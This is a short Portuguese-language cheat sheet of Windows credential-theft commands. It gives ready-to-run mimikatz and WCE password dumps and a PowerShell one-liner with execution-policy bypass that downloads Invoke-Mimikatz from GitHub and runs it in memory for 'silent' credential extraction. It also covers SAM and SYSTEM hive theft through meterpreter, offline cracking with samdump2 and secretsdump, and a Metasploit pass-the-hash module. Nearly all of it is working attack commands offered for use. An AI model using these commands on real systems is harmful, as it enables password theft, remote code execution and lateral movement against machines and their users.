### Obter senha do Windows 7 (mimikatz)
~~~~
mimikatz.exe
privilege::debug
sekurlsa::logonpasswords
~~~~

### Obter senha do Windows 7 (WCE)
~~~
wce.exe -w
~~~

### Uso do Mimikatz de dentro da PowerShell diretamente na memória para fazer uma extração silenciosa
~~~
powershell.exe -exec bypass -C "IEX (New-Object Net.WebClient).DownloadString('https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-Mimikatz.ps1');Invoke-Mimikatz -DumpCreds" > C:\Users\maicon\Downloads\pass.txt
~~~


### Extração dos arquivos SAM e SYSTEM para achar as credenciais através do samdump2
~~~
meterpreter> load powershell
meterpreter> powershell_shell
~~~

Buscar nos registros as chaves sam e system

~~~
PS> reg save hklm\sam c:\sam
PS> reg save hklm\system c:\system

meterpreter>download c:\\sam
meterpreter>download c:\\system
~~~

Nova aba como administrador
~~~
# samdump2 system sam
~~~

### Mais um método de extração dessa vez com um dos módulos do Impacket chamado Secretdump
~~~
git clone impacket
pip install -r requirements.txt
python3 setup.py install
secretsdump.py -sam sam -system system LOCAL
~~~

### PASS THE HASH
use exploit/windows/smb/psexec
